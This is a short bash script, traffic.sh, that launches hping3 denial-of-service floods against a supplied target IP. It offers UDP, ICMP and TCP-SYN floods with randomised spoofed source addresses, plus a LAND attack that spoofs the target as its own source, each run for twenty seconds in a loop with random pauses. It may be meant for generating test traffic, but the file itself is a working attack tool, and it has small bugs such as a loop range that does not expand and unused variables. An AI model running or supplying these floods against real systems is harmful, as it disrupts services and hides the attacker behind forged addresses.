#!/bin/bash
###
 # @Description: 
 # @Version: 1.0
 # @Autor: Ian Yang
 # @Date: 2024-04-26 00:47:31
 # @LastEditors: Ian Yang
 # @LastEditTime: 2024-04-26 12:19:07
### 

# If no argument supplied
if [ $# -lt 2 ]
  then
    echo "usage bash traffic.sh <target_ip> <flood_type>"
else 
    TARGET_IP="$1"
    FLOOD_TYPE="$2"
    NUM=$(shuf -i 1-3 -n 1)
    for count in {1..$NUM}; do
        N_PACKETS=$(shuf -i 10-20 -n 1)
        N_BYTES=$(shuf -i 150-200 -n 1)
        PAUSE=$(shuf -i 1-10 -n 1)
        case $FLOOD_TYPE in
            "UDP")
                sudo timeout 20s hping3 -2 -V -d 120 -w 64 --rand-source --flood "$TARGET_IP"
                ;;
            "ICMP")
                sudo timeout 20s hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood  "$TARGET_IP"
                ;;
            "TCP-SYN")
                sudo timeout 20s hping3 -S -V -d 120 -w 64 -p 80 --rand-source --flood "$TARGET_IP"
                ;;
            "LAND")
                sudo timeout 20s hping3 -1 -V -d 120 -w 64 --flood -a "$TARGET_IP" "$TARGET_IP"
                ;;
            *)
                echo "Invalid flood type. Please choose UDP, ICMP, or TCP-SYN."
                exit 1
                ;;
        esac
        sleep $PAUSE
    done
fi
